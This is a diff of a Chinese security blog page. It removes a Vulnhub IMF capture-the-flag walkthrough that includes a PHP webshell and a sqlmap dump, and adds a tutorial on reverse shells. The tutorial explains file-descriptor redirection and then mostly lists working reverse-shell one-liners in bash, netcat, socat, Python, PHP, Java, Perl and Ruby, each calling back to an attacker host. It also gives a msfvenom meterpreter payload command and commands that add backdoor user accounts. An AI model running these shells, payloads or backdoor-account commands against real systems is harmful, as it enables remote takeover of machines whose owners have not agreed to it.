@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Vulnhub,IMF,">
+  <meta name="keywords" content="安全,shell,文件描述符,">
 
 
 
@@ -81,25 +81,18 @@
 
 
 
-<meta name="description" content="简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址： https://download.vulnhub.com/imf/IMF.ova IMF是一个初级难度的boot 2 roo">
-<meta name="keywords" content="Vulnhub,IMF">
+<meta name="description" content="反弹shell介绍在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。 反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">
+<meta name="keywords" content="安全,shell,文件描述符">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Vulnhub实战之IMF">
-<meta property="og:url" content="https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/index.html">
+<meta property="og:title" content="渗透技术基础之反弹shell详解">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/index.html">
 <meta property="og:site_name" content="Six&#39;s Blog">
-<meta property="og:description" content="简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址： https://download.vulnhub.com/imf/IMF.ova IMF是一个初级难度的boot 2 roo">
+<meta property="og:description" content="反弹shell介绍在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。 反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b6f83bb111.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b702daf200.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b70d5d74b9.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b71e81f588.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b72f07db08.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b8422ef625.png">
-<meta property="og:updated_time" content="2019-03-03T09:13:55.563Z">
+<meta property="og:updated_time" content="2019-03-29T13:37:29.922Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Vulnhub实战之IMF">
-<meta name="twitter:description" content="简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址： https://download.vulnhub.com/imf/IMF.ova IMF是一个初级难度的boot 2 roo">
-<meta name="twitter:image" content="https://i.loli.net/2019/03/03/5c7b6f83bb111.png">
+<meta name="twitter:title" content="渗透技术基础之反弹shell详解">
+<meta name="twitter:description" content="反弹shell介绍在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。 反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">
 
 
 
@@ -129,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/">
+  <link rel="canonical" href="https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/">
 
 
 
 
 
-  <title>Vulnhub实战之IMF | Six's Blog</title>
+  <title>渗透技术基础之反弹shell详解 | Six's Blog</title>
   
 
 
@@ -334,7 +327,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/">
+    <link itemprop="mainEntityOfPage" href="https://sy-yunyi.github.io/2019/03/29/渗透技术基础之反弹shell详解/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Six">
@@ -351,7 +344,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Vulnhub实战之IMF</h1>
+          <h1 class="post-title" itemprop="name headline">渗透技术基础之反弹shell详解</h1>
         
 
         <div class="post-meta">
@@ -363,8 +356,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-03T00:00:00+08:00">
-                2019-03-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-29T00:00:00+08:00">
+                2019-03-29
               </time>
             
 
@@ -404,8 +397,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/03/03/Vulnhub实战之IMF/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/03/03/Vulnhub实战之IMF/" itemprop="commentCount"></span>
+                <a href="/2019/03/29/渗透技术基础之反弹shell详解/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/03/29/渗透技术基础之反弹shell详解/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -432,7 +425,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  876
+                  2.3k
                 </span>
               
 
@@ -448,7 +441,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3
+                  9
                 </span>
               
             </div>
@@ -469,61 +462,133 @@
       
 
       
-        <h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。</p>
-<p>网址：<a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com/</a></p>
-<p>本文靶机镜像下载地址：</p>
-<p><a href="https://download.vulnhub.com/imf/IMF.ova" target="_blank" rel="noopener">https://download.vulnhub.com/imf/IMF.ova</a></p>
-<p>IMF是一个初级难度的boot 2 root（查看flag，获得root权限）靶机，每个flag都包含获取下一个flag的提示。</p>
-<p>作者邮箱：<a href="mailto:geckom@redteamr.com" target="_blank" rel="noopener">geckom@redteamr.com</a></p>
+        <h3 id="反弹shell介绍"><a href="#反弹shell介绍" class="headerlink" title="反弹shell介绍"></a>反弹shell介绍</h3><p>在渗透测试中发现一个命令执行漏洞，我们可以利用反弹shell获取对目标主机的控制权。</p>
+<p>反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
 <a id="more"></a>
-<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>首先使用VMware运行获得的靶机镜像，进入系统发现需要输入密码。</p>
-<p>运行另一台攻击机，我选用的是Kali。使用nmap扫描网段端口，发现主机IP命令。</p>
-<p><img src="https://i.loli.net/2019/03/03/5c7b6f83bb111.png" alt="查找主机IP.png"></p>
-<p>获得目标主机IP地址：192.168.175.135</p>
-<p>对目标IP做进一步的扫描：</p>
-<p><img src="https://i.loli.net/2019/03/03/5c7b702daf200.png" alt="扫描主机.png"></p>
-<p>发现80端口上运行着Apache，利用IP地址直接访问网页。</p>
-<h5 id="渗透分析"><a href="#渗透分析" class="headerlink" title="渗透分析"></a>渗透分析</h5><p><img src="https://i.loli.net/2019/03/03/5c7b70d5d74b9.png" alt="网页.png"></p>
-<p>进入网站，网站有三个选项卡，查看源码，寻找线索。</p>
-<p>在第三个页面的源码处发现第一个flag。</p>
-<p><img src="https://i.loli.net/2019/03/03/5c7b71e81f588.png" alt="flag1.png"></p>
-<p>将第一个flag进行base64解密，得到flag2的提示<code>allthefiles</code>。</p>
-<p>根据提示，在源码中发现引用的JS文件名</p>
-<p><img src="https://i.loli.net/2019/03/03/5c7b72f07db08.png" alt="flag2.png"></p>
-<p>将文件名拼起来，解码，得到flag2：<code>flag2{aW1mYWRtaW5pc3RyYXRvcg==}</code></p>
-<p>再次base64解码后得到提示：<code>imfadministrator</code></p>
-<p>进入<code>192.168.175.135/imfadministrator/</code>，出现一个登录页。任意输入用户名，返回无效的用户名。在之前的网页上查找信息，在contact us页面上有三个人，进行尝试，发现输入第一个人名，返回信息变成了无效密码，说明用户名正确。</p>
-<p>同时阅读源码发现，密码并没有存储在数据库中，而是硬编码在文件中。</p>
-<p>猜测是使用strcmp之类的密码进行判断密码。<code>当strcmp的两个字符串参数相等时会返回0，但如果把string和array进行比较，同样也会返回0</code>.</p>
-<p>所以，这里将源码中的</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"pass"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">改为</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"pass[]"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这样就可以使得pass参数变成了一个array。</p>
-<p>获得flag3：<code>flag{Y29udGludWVUT2Ntcw==}</code></p>
-<p>base64解码后，获得：<code>continueTOcms</code>。</p>
-<p>进入CMS浏览网页，发现url中存在参数pagename，可能存在注入点，复制cookie信息，使用sqlmap进行注入测试：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.190.128/imfadministrator/cms.php?pagename=upload --cookie "PHPSESSID=9q75n4adk0os5lultm4a5934t2" --dump</span><br></pre></td></tr></table></figure>
-<p>dump在数据库中发现共有四项，后两项包含两张图片，访问后，发现第三项中的图片含有一个二维码，扫描后获得flag4：<code>flag4{dXBsb2Fkcjk0Mi5waHA=}</code>。解码后获得：<code>uploadr942.php</code></p>
-<p>根据提示，进入一个文件上传页面，应该存在文件上传漏洞。</p>
-<p>经过测试，只能上传图片（jpg,png,gif）,存在WAF和文件头过滤。上传成功后在注释中会出现上传后的文件名。</p>
-<p>尝试将PHP代码加入图片中。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $s=$_GET[<span class="string">'s'</span>]; <span class="keyword">echo</span> `$s`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在win 上，使用命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png/b+2.php 3.png</span><br></pre></td></tr></table></figure>
-<p>图片上传成功，需要寻找存储的路径，利用工具dirb：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.175.135/imfadministrator</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/03/03/5c7b8422ef625.png" alt="dirb.png"></p>
-<p>发现存在uploads文件夹。</p>
-<p>访问：<code>http://192.168.175.135/imfadministrator/uploads/ebfcb10328e2.gif？s = ls</code></p>
-<p>返回结果中，发现文件<code>flag5_abc123def.txt</code>，使用<code>s = cat flag5_abc123def.txt</code>,获得<code>flag5{YWdlbnRzZXJ2aWNlcw==}</code>，解码后得到<code>agentservices</code>。</p>
-<p>根据提示，入口点应该在一个名叫<code>agent</code>的服务上。</p>
-<blockquote>
-<p>未完待续</p>
-</blockquote>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
-<li>源文件包含flag</li>
-<li>分析源码，如本文中的flag3</li>
-<li>WAF绕过</li>
+<p>反弹shell通常被用于因防火墙、权限补足、端口占用等情况下。</p>
+<ol>
+<li>目标主机在内网，无法直接连接</li>
+<li>目标主机IP动态改变</li>
+<li>由于防火墙等的限制，只能目标主机发送请求，不能接收请求</li>
+<li>目标是获取目标主机的shell</li>
+</ol>
+<h3 id="Linux文件描述符和重定向"><a href="#Linux文件描述符和重定向" class="headerlink" title="Linux文件描述符和重定向"></a>Linux文件描述符和重定向</h3><p>谈到反弹shell，就不得不说Linux下的文件描述符和重定向。</p>
+<p>因为反弹shell的书写通常情况下是简短精炼，并且会涉及到Linux的输入输出的重定向。</p>
+<p>像这</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.64.1/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>或者这个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;192.168.64.1&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<p>像上面两条反弹shell中的<code>0&gt;&amp;1</code>，<code>2&gt;&amp;3</code>就是Linux中文件描述符及重定向的写法。</p>
+<h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><p><strong>linux文件描述符</strong>：Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
+<p>文件描述符在形式上是一个非负整数。</p>
+<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
+<ul>
+<li><p>标准输入 stdin <code>0</code> </p>
+</li>
+<li><p>标准输出 stdout <code>1</code></p>
+</li>
+<li><p>错误输出 stderr<code>2</code></p>
+</li>
 </ul>
+<p>在Linux中子进程会继承父进程的文件描述符，所以任何进程都具有这3个文件描述符。</p>
+<h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><p>一条命令执行以前先会按照默认的情况进行绑定，如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
+<p><strong>输出重定向</strong>： <code>&gt;</code>  ；<code>&gt;&gt;</code>  追加输出重定向 </p>
+<p><strong>输入重定向</strong>： <code>&lt;</code>  ；<code>&lt;&lt;</code>  追加输入重定向</p>
+<p>直接使用<code>&gt;</code>或<code>&lt;</code>,是对标准输入或输出的重定向</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command &gt; file1</span><br></pre></td></tr></table></figure>
+<p>假设上面的命令command原本在屏幕上输出，现在就将命令的执行结果【标准输出<code>1</code>】重定向至file1中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command &lt; file1</span><br></pre></td></tr></table></figure>
+<p>Unix 命令也可以从文件获取输入，本来需要从键盘获取输入的命令会转移到文件读取内容。</p>
+<p><code>&gt;&gt;</code>和<code>&lt;&lt;</code>追加的意思是在原来文件内容后面进行追加，如果是<code>&lt;</code>和<code>&gt;</code>是会创建新的文件，在写入内容。</p>
+<p>对于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command &gt; file 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><code>&amp;</code>的含义是将后面的数字当作是文件描述符，如果不加<code>&amp;</code>,在<code>&gt;</code>或<code>&lt;</code>后面的数字会被视作一个文件名。</p>
+<p>重定向命令的解释是从做向右的，所以不同的顺序产生的结果也是不同的。</p>
+<p>所以上面命令含义是，首先将标准输出<code>1</code>重定向至<code>file</code>，又将标准错误输出<code>2</code>重定向至<code>1</code>,所以标准错误输出<code>2</code>也重定向至了<code>file</code>,所以有人也将<code>&amp;</code>视作是将<code>1</code>和<code>2</code>合并的符号，将<code>1</code>和<code>2</code>合并后一起重定向至<code>file</code>。</p>
+<h3 id="反弹shell实例"><a href="#反弹shell实例" class="headerlink" title="反弹shell实例"></a>反弹shell实例</h3><h4 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.175.134/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>命令解释：</p>
+<p>bash -i : bash是Linux下一个常见的shell，<code>-i</code>参数表示产生一个交互式的shell</p>
+<p>/dev/tcp/192.168.175.134/8080 : <code>/dev/tcp|udp/ip/port</code>是一个Linux中比较特殊的一个文件，如果在Linux上访问就会发现这个文件并不存在，其含义是让主机与目标主机<code>ip</code>在端口<code>port</code>建立一个tcp或udp连接</p>
+<p>0&gt;&amp;1：将标准输入<code>0</code>输出重定向至标准输出<code>1</code>。或者可以这么理解，将标准输入<code>0</code>和标准输出<code>1</code>合并，在重定向至<code>1</code>，因为前面已经将标准输出<code>1</code>重定向至<code>/dev/tcp/192.168.175.134/8080</code>，所以现在标准输入<code>0</code>和标准输出<code>1</code>都指向<code>/dev/tcp/192.168.175.134/8080</code>。</p>
+</blockquote>
+<h4 id="netcat-NC-反弹"><a href="#netcat-NC-反弹" class="headerlink" title="netcat(NC) 反弹"></a>netcat(NC) 反弹</h4><p>Netcat反弹也是非常常用的方法，但是linux发行版现在自带的NC都是被阉割过的，无法执行参数<code>-e</code>。</p>
+<p>这时我们需要在目标机上手动安装NC。</p>
+<p>NC的利用过程</p>
+<ol>
+<li><p>在攻击机开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 端口号</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目标机运行反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 攻击机地址 端口号 -t -e /bin/bash</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>-e</code>：参数的含义是程序重定向，这里我们将目标机的bash定向至了我们的攻击机，这就是反弹会来的shell。</p>
+</blockquote>
+</li>
+</ol>
+<p>如果不能重新安装NC也是有办法实现。</p>
+<p>第一步也是在攻击机进行监听，然后在目标机执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+</blockquote>
+<p>或者</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
+<h4 id="exec反弹"><a href="#exec反弹" class="headerlink" title="exec反弹"></a>exec反弹</h4><p>exec可以实现将文件描述符和文件绑定在一起。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 3&lt;&gt;file</span><br></pre></td></tr></table></figure>
+<p>以读写方式将文件描述符<code>3</code>与文件<code>file</code>绑定在一起，当然也可以只赋予一个权限，读或写。</p>
+<p>实现反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333 : 将文件描述符<code>5</code>，以读写的方式绑定在<code>/dev/tcp/192.168.146.129/2333</code>，上文已经讲了，这个命令另目标机与攻击机建立了一个tcp连接。</p>
+<p>cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&1;done ：非常经典的命令。可以换个形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; while read line</span><br><span class="line">&gt; do</span><br><span class="line">&gt;     …</span><br><span class="line">&gt; done &lt; file</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>从文件中依次读取每一行，将其赋值给 line 变量，之后再在循环中对line进行操作。这里不是从文件中读取，而是从管道中读取攻击机传送过来的命令，并将标准输出<code>1</code>和标准错误输出<code>2</code>都重定向到了文件描述符<code>5</code>，也就是攻击机上。</p>
+</blockquote>
+<p>还有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+<h4 id="socat反弹"><a href="#socat反弹" class="headerlink" title="socat反弹"></a>socat反弹</h4><p>Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，其基于socket，可以实现与socket任务，功能与netcat类似，可以看做netcat的加强版。</p>
+<p>在攻击机上进行监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:1234 -</span><br></pre></td></tr></table></figure>
+<p>在目标机上执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:攻击机IP:1234</span><br></pre></td></tr></table></figure>
+<h4 id="编程语言脚本反弹"><a href="#编程语言脚本反弹" class="headerlink" title="编程语言脚本反弹"></a>编程语言脚本反弹</h4><p>第一步在攻击机本地开启TCP8080端口的监听，然后在目标机运行下面脚本。</p>
+<p>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.175.134",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
+<p>php脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("192.168.31.41",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+<p>Java脚本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<p>perl脚本</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+<p>ruby脚本</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
+<p> 有时候获得了shell，但是却没有交互界面，效果也不大，这时就需要python来获取标准的虚拟终端环境。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+<p>可以获得很完美的虚拟终端。</p>
+<h3 id="msfvenom-获取反弹一句话"><a href="#msfvenom-获取反弹一句话" class="headerlink" title="msfvenom 获取反弹一句话"></a>msfvenom 获取反弹一句话</h3><p>强大的MSF框架为我们提供了生成一句话反弹shell的工具，即msfvenom。</p>
+<p>在Metasploit中,我们可以使用msfvenom -l 来查询生成我们所需要的各类命令行一句话。</p>
+<p>部分参数：</p>
+<blockquote>
+<p><code>-p</code> 选择一个载荷<br><code>-l</code> 载荷列表，包括payloads, encoders, nops, platforms, formats, all<br><code>-f</code> 生成的文件格式<br><code>-e</code> 编码方式<br><code>-i</code> 编码次数<br><code>-b</code> 在生成的程序中避免出现的值<br><code>-h</code> 帮助</p>
+</blockquote>
+<p>查看所有的payloads</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads</span><br></pre></td></tr></table></figure>
+<p>生成脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.80.142 lport=443 -f exe X &gt; flash_win7.exe</span><br></pre></td></tr></table></figure>
+<h4 id="一句话添加账户"><a href="#一句话添加账户" class="headerlink" title="一句话添加账户"></a>一句话添加账户</h4><p> <strong>chpasswd 方法</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd newuser;echo "newuser:password"|chpasswd</span><br></pre></td></tr></table></figure>
+<p><strong>useradd -p 方法</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -p `openssl passwd 123456` guest</span><br></pre></td></tr></table></figure>
+<p><strong>echo -e 方法</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd newuwer;echo -e "123456n123456n" |passwd newuser</span><br></pre></td></tr></table></figure>
+<p>参考来源;</p>
+<ol>
+<li>【技术分享】linux各种一句话反弹shell总结 <a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></li>
+<li>Linux 反弹shell（二）反弹shell的本质 <a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a></li>
+</ol>
 
       
     </div>
@@ -541,9 +606,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
+            <a href="/tags/安全/" rel="tag"><i class="fa fa-tag"></i> 安全</a>
           
-            <a href="/tags/IMF/" rel="tag"><i class="fa fa-tag"></i> IMF</a>
+            <a href="/tags/shell/" rel="tag"><i class="fa fa-tag"></i> shell</a>
+          
+            <a href="/tags/文件描述符/" rel="tag"><i class="fa fa-tag"></i> 文件描述符</a>
           
         </div>
       
@@ -556,8 +623,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/26/计网实验基础之网络命令-ipconfigifconfig和netstat/" rel="next" title="计网实验基础之网络命令-ipconfig/ifconfig和netstat">
-                <i class="fa fa-chevron-left"></i> 计网实验基础之网络命令-ipconfig/ifconfig和netstat
+              <a href="/2019/03/27/计网实验之Socket网络编程/" rel="next" title="计网实验之Socket网络编程">
+                <i class="fa fa-chevron-left"></i> 计网实验之Socket网络编程
               </a>
             
           </div>
@@ -565,10 +632,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/20/计网实验之网络包分析工具-Wireshark/" rel="prev" title="计网实验之网络包分析工具-Wireshark">
-                计网实验之网络包分析工具-Wireshark <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -726,7 +789,7 @@
             
 
             
